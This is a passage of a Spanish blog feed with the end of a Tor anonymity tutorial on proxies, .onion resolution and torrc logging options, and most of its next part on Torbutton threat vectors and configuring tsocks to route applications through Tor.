&lt;h2 id=&#34;3-cuál-proxy-elegir&#34;&gt;3. ¿Cuál Proxy elegir?&lt;/h2&gt;

&lt;p&gt;Hay algunos proxies disponibles que podríamos usar, pero la mayoría de las comunidades utilizan Privoxy o Polipo. Hay un par de razones por las cuales es preferible usar Polipo que Privoxy, y se describen en detalle aquí: Privoxy vs. Polipo. Para resumir, estas son las razones por las cuales Polipo es la mejor opción:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Privoxy no tiene pipelining para HTTP 1.1&lt;/li&gt;
&lt;li&gt;Privoxy cachea los objetos más pedidos&lt;/li&gt;
&lt;li&gt;Privoxy necesita transferir la página entera para parsearla y mostrarla al usuario. Esto significa que la experiencia del usuario con Privoxy es mucho peor, debido a que el usuario debe esperar constantemente que los datos de la página web completa sean transferidos desde el servidor, antes de ser mostrados.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pero hay otra pregunta que debemos hacernos. ¿Por qué necesitamos incluso un proxy HTTP si podemos usar el proxy de Tor SOCKS desde el navegador? La respuesta es que generalmente el proxy SOCKS del navegador usa algunas variables de configuración default que no toleran Tor de la misma forma que Privoxy o Polipo pueden. Lo más sorprendente son los timeouts, que ocurren muy frecuentemente si usamos directamente el proxy SOCKS.&lt;/p&gt;

&lt;h2 id=&#34;4-tor-hidden-services-cómo-puedo-mantenerme-anónimo-y-hostear-mi-propio-servidor-en-la-red-tor&#34;&gt;4. Tor Hidden Services: Cómo puedo mantenerme anónimo y hostear mi propio servidor en la red Tor&lt;/h2&gt;

&lt;p&gt;Los servicios ocultos de Tor usan el hostname que termina con el dominio .onion . Ese TLD (Top Level Domain) no puede ser usado sobre Internet normalmente; sus correspondientes hostnames sólo pueden usarse sobre la red de Tor, la cual sabe cómo resolverlos dentro de sus direcciones IP ocultas.&lt;/p&gt;

&lt;p&gt;Veamos qué pasa si intentamos resolver un hostname de DuckDuckGo, el cual es un motor de búsqueda usado para buscar websites en la red anónima de Tor. Usemos los comandos dig y tor-resolve de la siguiente forma:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tor-resolve 3g2upl4pq6kufc4m.onion 127.0.0.1:9050
dig @localhost -p &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; 3g2upl4pq6kufc4m.onion
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ambos comandos reportan la dirección IP 127.192.0.10. Podemos observar que esa dirección IP pertenerce al localhost, dado que todas las direcciones IP 127.0.0.0/24 son asignadas al localhost, de hecho 127.0.0.1 es la más comunmente usada. Esto efectivamente logra anonimizar los servidores web en la red Tor, ergo, no se pueden rastrear.&lt;/p&gt;

&lt;p&gt;Pero hay más que contar en esta historia que sólo la resolución de los dominios .onion, pero no entraremos en detalle por el momento - queda pendiente para futuros artículos.&lt;/p&gt;

&lt;h2 id=&#34;5-opciones-de-log-en-tor&#34;&gt;5. Opciones de log en Tor&lt;/h2&gt;

&lt;p&gt;Si instalamos Vidalia, entonces podemos ver nuestros logs en el &amp;#8220;Message Log&amp;#8221;, pero si no usamos Vidalia, obtener nuestros logs puede ser un poco más complicado. Si todo está configurado y funcionando, probablemente podemos obtener los logs buscando en el directorio /var/log/tor. El siguiente comando muestra los logs como aparecen en la pantalla:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tail -f /var/log/tor/tor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Pero hay también varias opciones de log que podemos configurar en el archivo /etc/tor/torrc. Las variables de configuración relevantes son las siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Log minSeverity-maxSeverity stderr&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;stdout&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;syslog
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Envía todos los mensajes entre la mínima y máxima severidad a alguno de los canales de salida: standard error, standard output o syslog.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Log minSeverity-maxSeverity file &amp;lt;filename&amp;gt;&amp;lt;/filename&amp;gt;&amp;lt;filename&amp;gt;.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Los niveles de severidad son los siguientes: debug, info, notice, warn y err. Una buena opción de configuración es la siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Log notice-err file /var/log/tor/tor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Esto efectivamente loggea todos los mensajes al archivo /varlog/tor/tor.&lt;/p&gt;

&lt;h2 id=&#34;6-opciones-de-configuración-avanzada-de-tor&#34;&gt;6. Opciones de configuración avanzada de Tor&lt;/h2&gt;

&lt;h3 id=&#34;httpproxy&#34;&gt;HTTPProxy&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Configura a Tor para hacer peticiones de directorio a través del host:port especificado por esta variable de configuración.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;httpproxyauthenticator&#34;&gt;HTTPProxyAuthenticator&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica el nombre de usuario y contraseña usados para autenticarse en el proxy HTTP.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;httpsproxy&#34;&gt;HTTPSProxy&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Configura a Tor para hacer todas las peticiones de conexión SSL através del host:port especificado en esta variable.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;httpsproxyauthenticator&#34;&gt;HTTPSProxyAuthenticator&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica el nombre de usuario y contraseña necesarios para autenticarse en el proxy HTTPS.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;socks4proxy&#34;&gt;Socks4Proxy&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Configura a Tor para establecer todas las conexiones a través del proxy SOCKS4 en el host:port.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;socks5proxy&#34;&gt;Socks5Proxy&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Configura a Tor para establecer todas las conexiones a través del proxy SOCKS5 en el host:port.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;socks5proxyusername&#34;&gt;Socks5ProxyUsername&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica el nombre de usuario utilizado para autenticarse en el proxy SOCKS5.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;socks5proxypassword&#34;&gt;Socks5ProxyPassword&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica la contraseña utilizada para autenticarse en el proxy SOCKS5.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;keepaliveperiod&#34;&gt;KeepAlivePeriod&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica el tiempo que usa Tor para enviar &lt;em&gt;keepalives&lt;/em&gt; para mantener la conexión abierta.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;controlport&#34;&gt;ControlPort&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Especifica el puerto en el cual podemos conectarnos a Tor y controlarlo. Si se setea en &amp;#8216;auto&amp;#8217;, Tor automáticamente elige un puerto por nosotros, de otra manera usa el especificado.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;newcircuitperiod&#34;&gt;NewCircuitPeriod&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Considera construir un nuevo circuito por cada N segundos (default: 30 segundos).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Las opciones de configuración que son relevantes para el proxy SOCKS en la red Tor son las siguientes:&lt;/p&gt;

&lt;h3 id=&#34;socksport&#34;&gt;SocksPort:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Determina en qué número de puerto el proxy SOCKS escuchará por conexiones entrantes.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;sockslistenaddress&#34;&gt;SocksListenAddress&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Determina en qué dirección IP los proxies SOCKS escucharán las conexiones entrantes.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;sockstimeout&#34;&gt;SocksTimeout&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Determina en cuánto tiempo Tor puede intentar establecer un circuito antes de que se cumpla el timeout (default: 2 minutos).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Deberíamos comprender las últimas 3 variables de configuración, dado que son muy importantes porque el proxy SOCKS es obligatorio como un entry point a la red Tor.&lt;/p&gt;

&lt;h2 id=&#34;7-finalizando&#34;&gt;7. Finalizando&lt;/h2&gt;

&lt;p&gt;Queda pendiente analizar Torbutton y tsocks para ver cómo anonimizarnos en Internet, para usar una aplicación sobre la red Tor incluso cuando no traen soporte para el servidor proxy SOCKS.&lt;/p&gt;

&lt;h2 id=&#34;referencias&#34;&gt;Referencias&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;InfoSec Institute Resources&lt;/em&gt; »» &lt;a href=&#34;http://resources.infosecinstitute.com/tor-part-2/&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Logrando el anonimato con Tor (Parte 3) : Torbutton y Tsocks</title>
            <link>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-3-torbutton-y-tsocks/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-3-torbutton-y-tsocks/</guid>
            <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; title=&#34;Logrando el anonimato con Tor (Parte 1)&#34;&gt;Logrando el anonimato con Tor (Parte 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/&#34;&gt;Logrando el anonimato con Tor (Parte 2): Servidores DNS y Proxies&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Logrando el anonimato con Tor (Parte 3): TorButton y Tsocks&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-4/&#34; title=&#34;Logrando el anonimato con Tor (Parte 4) – Tor para relés&#34;&gt;Logrando el anonimato con Tor (Parte 4): Tor para relés&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;1-introducción&#34;&gt;1. Introducción&lt;/h2&gt;

&lt;p&gt;En los artículos previos: &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; target=&#34;_blank&#34;&gt;Parte 1 &lt;/a&gt;y &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/&#34; target=&#34;_blank&#34;&gt;Parte 2&lt;/a&gt; usamos de forma extensiva Tor Browser Bundle que nos ayuda a garantizar el anonimato.&lt;/p&gt;

&lt;p&gt;Con Tor Browser Bundle, podemos facilmente comenzar a usar Tor sin instalar ni configurar ninguna otra cosa adicional. Contiene además  un proyecto interesante, un navegador web que está basado en Firefox y está configurado específicamente para proteger nuestra identidad en Internet. No entraremos mucho en detalle sobre las características de Tor Browser Bundle, pero miraremos específicamente las características caseras en el navegador Firefox que nos protegen de perder nuestra identidad. Tor Browser Bundle contiene los siguientes componentes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Vidalia&lt;/strong&gt;: Una interface gráfica de usuario para Tor.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Tor&lt;/strong&gt;: Un componente que te permite asegurar el anonimato .&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mozilla Firefox&lt;/strong&gt;: Un navegador web.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Torbutton&lt;/strong&gt;: Se encargar de aplicar los niveles de seguridad por lo que Firefox no es vulnerado en ninguna información de seguridad.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos además descargar el código fuente de Tor Browser Bundle de &lt;a href=&#34;https://www.torproject.org/projects/torbrowser-details.html&#34; target=&#34;_blank&#34;&gt;aquí&lt;/a&gt; y construirlo nosotros mismos.&lt;/p&gt;

&lt;p&gt;Al iniciar Firefox, aparecerá la siguiente pantalla:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;081712_1515_AchievingAn1&#34; src=&#34;https://elbauldelprogramador.com/img/2013/04/081712_1515_AchievingAn1.png&#34; width=&#34;300px&#34; height=&#34;114px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;2-torbutton&#34;&gt;2. Torbutton&lt;/h2&gt;

&lt;p&gt;El sitio oficial de Tor recomienda que usemos el boton Torbutton como parte del Tor Browser Bundle y no instalar Torbutton nosotros mismos ya que un error humano puede resultar por configurar Firefox de manera incorrecta. Esto podría entonces implicar falta de seguridad y liberación de información privada. Torbutton solía integrarse a Firefox por medio de un plugin y teníamos la posibilidad de instalarlo manualmente, pero luego fue removido de los addons, por lo que nos obliga a usarlo junto con Tor Browser Bundle.&lt;/p&gt;

&lt;p&gt;Veamos los factores que pueden comprometer la seguridad de Torbutton en la red &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; title=&#34;Logrando el anonimato con Tor (Parte 1)&#34;&gt;1&lt;/a&gt;:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Exit Node o Upstream Router

&lt;ul&gt;
&lt;li&gt;En este escenario, un atacante corre un &lt;em&gt;exit node&lt;/em&gt; en la red Tor, o controla el router que está ubicado entre el exit node y la máquina destino. El atacante puede entonces interceptar peticiones/respuestas que viajan del cliente al servidor y cambiarlas para revelar la identidad del usuario.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Servidores de Anuncios y/o Sitios Web maliciosos

&lt;ul&gt;
&lt;li&gt;Cuando un atacante controla el sitio que estamos tratando de alcanzar obviamente puede alimentarnos con respuestas anómalas que pueden comprometer nuestro anonimato.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Red local/ISP/Upstream Router

&lt;ul&gt;
&lt;li&gt;El peligro aquí yace en un atacante que controla cualquier router entre la red local, el ISP y el sitio web destino. Esto puede ser peligroso si el usuario tiene Tor desactivado porque el atacante puede entonces inyectar código arbitrario dentro de la conexión cliente. Esto es sólo probable cuando estamos habilitando/inhabilitando Tor constantemente, por lo que el atacante puede analizar la correlatividad entre el tráfico con y sin Tor, y descubrir nuestra dirección IP fuente.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Acceso físico

&lt;ul&gt;
&lt;li&gt;Cuando un atacante tiene acceso físico a la máqina del cliente, puede hacer casi cualquier arbitrariedad a la máquina. Esto puede llevar obviamente a la pérdida del anonimato.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Podemos ver que el anonimato del usuario puede ser fácilmente violado si un atacante puede obtener acceso a la red local, routers entre las redes locales, e ISP a un nodo de entrada de Tor (o un nodo de salida de Tor al sitio web destino) incluyendo el sitio web mismo. Por favor pon atención a que no cualquier nodo es parte de la red Tor. Si pensamos un poco en esto, todo tiene sentido. Dado que todas las conexiones están encriptadas, es solo la red Tor misma la que no es vulnerable, por lo que el atacante no puede inyectar código malicioso como respuesta a nuestra petición.&lt;/p&gt;

&lt;p&gt;Ahora veamos cómo un atacante puede comprometer el anonimato de un usuario final: Primero necesitamos asumir que un atacante puede inyectar una respuesta arbitraria dentro de nuestro navegador como describimos antes. Los posibles vectores de ataque se resumen a continuación &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; title=&#34;Logrando el anonimato con Tor (Parte 1)&#34;&gt;1&lt;/a&gt;:&lt;/p&gt;

&lt;h3 id=&#34;inserción-de-javascript&#34;&gt;Inserción de JavaScript&lt;/h3&gt;

&lt;p&gt;Si un atacante inserta JavaScript en una de las respuestas devueltas al usuario, puede realizar actividad en la red luego de que Tor haya sido desactivado. Por lo tanto puede revelar la verdadera identidad del usuario y llevar a descubrir la dirección IP externa. JavaScript además tiene acceso al historial del navegador y funciones que pueden devolver información del sistema operativo, CPU y usuario agente que utilizamos, dejándonos cada vez menos anónimos.&lt;/p&gt;

&lt;h3 id=&#34;inserción-de-plugins&#34;&gt;Inserción de Plugins&lt;/h3&gt;

&lt;p&gt;Un plugin de Firefox que incluya trabajo en la red debería obedecer la configuración del proxy del navegador. Pero puede también desobedecerlo y escapar de esta configuración instanciando la conexión normal a Internet sin pasar por Tor en ningún momento. Este proceso de bypass revela la IP del cliente al sitio web destino. Si el plugin contiene vulnerabilidades, es además posible explotarlas, nuevamente, revelando la identidad del usuario.&lt;/p&gt;

&lt;h3 id=&#34;inserción-de-css&#34;&gt;Inserción de CSS&lt;/h3&gt;

&lt;p&gt;Si un atacante puede inyectar CSS, puede entonces hacer que el navegador web revele la dirección IP externa del cliente a través de popups CSS, los cuales son manejadores de eventos que obtienen contenido a través del atributo CSS *onmouseover.* Ahora imagina que esos popups tienen la posibilidad de conectarse a Internet y envíar peticiones al sitio web destino *bypasseando *Tor.&lt;/p&gt;

&lt;h3 id=&#34;lectura-e-inserción-de-cookies&#34;&gt;Lectura e inserción de Cookies&lt;/h3&gt;

&lt;p&gt;Si un atacante puede obtener una cookie de un usuario autenticado, puede, por supuesto, logearse como el usuario sin demasiado esfuerzo. Esta funcionalidad debería ser prevenida por el uso de clientes certificados que bloquearían los atacantes de identificarse con un usuario arbitrario incluso si el mismo atacante consiguió de alguna manera las cookies de usuarios relevantes.&lt;/p&gt;

&lt;h3 id=&#34;creación-de-contenido-arbitrario-en-caché&#34;&gt;Creación de contenido arbitrario en Caché&lt;/h3&gt;

&lt;p&gt;Un navegador web puede almacenar un montón de información en su caché para acceder más rápidamente al recurso cuando es requerido de nuevo - de los cuales algunos son identificadores únicos. Dado que la caché no tiene la misma política origen, estas entradas pueden ser leidas por cualquier dominio, y por ende revelar información sensible al atacante.&lt;/p&gt;

&lt;h3 id=&#34;usuarios-con-fingerprint-huella-digital-basada-en-atributos-del-navegador&#34;&gt;Usuarios con *Fingerprint (*Huella digital) basada en atributos del navegador&lt;/h3&gt;

&lt;p&gt;Si un atacante puede tomar la huella digital del navegador web del usuario, puede obtener una gran cantidad de información de las propiedades del navegador, las cuales pueden identificar unívocamente al usuario. Si el sitio web recuerda esas configuraciones puede revelar la identidad del usuario cuando visita el sitio web destino normalmente a través de Tor. Esto es posible por todas las formas que un usuario puede configurar su navegador web para hacerlo único - la más común es personalizando el navegador utilizando un set de plugins.&lt;/p&gt;

&lt;h3 id=&#34;aprovechar-un-navegador-o-sistema-operativo-de-forma-local-o-remota&#34;&gt;Aprovechar un navegador o Sistema Operativo de forma local o remota&lt;/h3&gt;

&lt;p&gt;Un atacante puede incluso explotar al navegador web mismo, al plugin, o la vulnerabilidad del sistema operativo, para obtener accesos a la máquina cliente. Esto lleva a comprometer totalmente al sistema del cliente, el cual por supuesto también revela la dirección IP externa.&lt;/p&gt;

&lt;p&gt;De todos los puntos mencionados, podemos captar que un componente efectivo de Torbutton se necesita para esconder cualquier información personal del usuario que puede revelar la identidad del cliente. Esto puede lograrse implementando las siguientes caracteristicas:&lt;/p&gt;

&lt;h3 id=&#34;obediencia-al-proxy&#34;&gt;Obediencia al Proxy&lt;/h3&gt;

&lt;p&gt;El navegador web debe usar el proxy Tor todo el tiempo y no debe permitir que ningún componente de red habilitado lo bypassee y acceda a Internet por la vía normal.&lt;/p&gt;

&lt;h3 id=&#34;separación-de-estado&#34;&gt;Separación de Estado&lt;/h3&gt;

&lt;p&gt;Toda la información guardada por el navegador web para mejorar la experiencia del usuario, como las cookies, el historial, DOM, caché, etc, debería ser accesible sólo cuando se usa en el estado Tor-enabled.&lt;/p&gt;

&lt;h3 id=&#34;aislamiento-de-la-red&#34;&gt;Aislamiento de la red&lt;/h3&gt;

&lt;p&gt;Todas las páginas web que fueron accedidas por el navegador deben utilizarse para mejorar la actividad de red solamente cuando se trabaja en el estado Tor-enabled.&lt;/p&gt;

&lt;h3 id=&#34;tor-oculto&#34;&gt;Tor Oculto&lt;/h3&gt;

&lt;p&gt;Si el sitio web objetivo está identificando la huella digital del navegador web utilizado para accederlo, puede ser una gran utilidad ocultar la presencia de Tor. De todos modos, esconder el navegador web utilizado con su número de versión y plugins instalados puede ayudar a reducir la efectividad de identificar digitalmente al navegador web.&lt;/p&gt;

&lt;h3 id=&#34;evitar-el-disco&#34;&gt;Evitar el disco&lt;/h3&gt;

&lt;p&gt;El navegador web no debería escribir ninguna información relacionada con Tor en el disco rígido, pero debería almacenarla en memoria hasta que el usuario cierre el navegador web, momento en el cual el navegador debería descartar toda la información. Esto asegura que los datos persistentes no quedan yaciendo abandonados en algún lugar del disco rígido incluso luego de que el usuario haya terminado de visitar el sitio.&lt;/p&gt;

&lt;h3 id=&#34;neutralidad-de-la-ubicación&#34;&gt;Neutralidad de la ubicación&lt;/h3&gt;

&lt;p&gt;El navegador web debería prevenir que se flitre cualquier información sobre la zona horaria a través de la red Tor.
Set de preservación del anonimato
El navegador web debería prevenir que se flitre cualquier información que pueda ser tomada como huella digital para el sitio web destino ( plugins instalados, user agent, etc). Debería prevenir que el sitio web destino pueda rastrear usuarios con la información tomada como huella digital, la cual puede ser utilizada para descubrir el cliente actual conectado a un sitio web incluso cuando Tor está activado.&lt;/p&gt;

&lt;h3 id=&#34;actualización-segura&#34;&gt;Actualización segura&lt;/h3&gt;

&lt;p&gt;El navegador web debería bloquear cualquier actualización sin autenticar vía Tor, dado que atacantes pueden inyectar un programa de actualización malicioso al navegador.&lt;/p&gt;

&lt;p&gt;Presentamos algunas razones de porqué los usuarios deberían utilizar Torbutton e inmediatamente integrar Tor Browser Bundle dentro del navegador web Firefox. Este provee algunas modificaciones que pueden hacer a nuestra navegación web más segura y anónima. Si usamos Torbutton fuera de Tor Browser Bundle, existe un gran riesgo de que el navegador haga algo inesperado, que pueda comprometer a nuestro anonimato.
Debemos mencionar también que Torbutton está integrado dentro de Firefox solamente, dado que es open source. Torbutton no tiene soporte disponible para otros navegadores como IE, Opera, Safari, etc. ni nunca tendrá.&lt;/p&gt;

&lt;h2 id=&#34;3-tsocks&#34;&gt;3. Tsocks&lt;/h2&gt;

&lt;p&gt;Tor tiene el proxy SOCKS corriendo en el puerto 9050 que podemos usar para asegurar anonimato en cualquier tráfico que se envíe a través del proxy SOCKS a la red Tor. Pero nuestra aplicación necesita tener soporte para este proxy, o de lo contrario no podremos usarla para acceder a internet de forma anónima. Pero no hay que alarmarse todavía. Hay una solución para este problema. Incluso si el programa no tiene soporte para el servidor proxy SOCKS, o cualquier otro servidor proxy que importe, podemos garantizarnos navegar en internet anónimamente utilizando el programa Torify. Éste usa un programa llamado tsocks que puede enviar conexiones TCP a través del servidor SOCKS. Podemos además utilizar directamente tsocks para lograrlo, como vemos a continuación:&lt;/p&gt;

&lt;p&gt;Primero necesitamos instalar tsocks si todavía no lo hemos hecho. Por ejemplo, si utilizamos la distribución de Linux Ubuntu, ejecutamos en un terminal:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;apt-get install tsocks
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Si instalamos en la distribución &lt;a href=&#34;https://elbauldelprogramador.com/como-instalar-actualizar-elminar-paquetes-gentoo/&#34; title=&#34;Cómo Instalar/actualizar/eliminar Paquetes en Gentoo&#34;&gt;Gentoo&lt;/a&gt;, primero tenemos que activar tordns useflag, la cual permite que las consultas de DNS sean enviadas por Tor y elimina el problema de filtración por DNS que comentábamos en la parte 2. Para instalarlo entonces debe ejecutarse:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;net-proxy/tsocks tordns&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/portage/package.use
emerge net-proxy/tsocks
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Luego necesitamos configurar tsocks para usar Tor. Podemos hacerlo editando el archivo de configuración &lt;code&gt;/etc/tsocks.conf&lt;/code&gt; . Lo mínimo indispensable que debe contenter es lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 192.168.1.0/255.255.255.0
&lt;span class=&#34;nv&#34;&gt;server&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 127.0.0.1
&lt;span class=&#34;nv&#34;&gt;server_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 5
&lt;span class=&#34;nv&#34;&gt;server_port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 9050
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Con la variable de configuración local podemos especificar que esta máquina puede acceder directamente a la red 192.168.1.0/24. Las otras variables indican el host y el puerto del sevidor SOCKS de Tor y su tipo, el cual en este caso es 5 (el valor default es 4).&lt;/p&gt;

&lt;p&gt;La sintaxis del comando de tordns es muy sencilla y se puede obtener en la página del &lt;a href=&#34;http://linux.die.net/man/1/tsocks&#34; target=&#34;_blank&#34;&gt;man page&lt;/a&gt; de Linux:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tsocks &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;aplicacion &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;argumentos para la aplicacion&lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# o&lt;/span&gt;
tsocks &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;on&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;off&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# o&lt;/span&gt;
tsocks
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Podemos ver que necesitamos especificar la aplicación que queremos que utilice el proxy de Tor. Nótese que sólo los paquetes TCP serán ruteados a través de Tor; los paquetes UDP serán distribuidos normalmente, por lo que tenemos que tener cuidado de ello. Podemos testear rápidamente esto accediendo a un archivo en nuestro propio servidor web Apache con el programa wget. Primero tenemos que hacer los siguientes cambios en nuestra máquina servidora para que podamos observar todos los accesos a los recursos de Apache:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tail -f /var/log/apache2/access.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A continuación deberíamos descargar algunos recursos normalmente (sin tsocks) para confirmar que la dirección IP se muestra correctamente. Cuando estamos seguros que eso ocurre, podríamos testear tsocks para asegurarnos que la IP es anónima:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tsocks wget http://www.server.com/image.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En el log de acceso deberíamos observar una entrada como la siguiente:&lt;/p&gt;
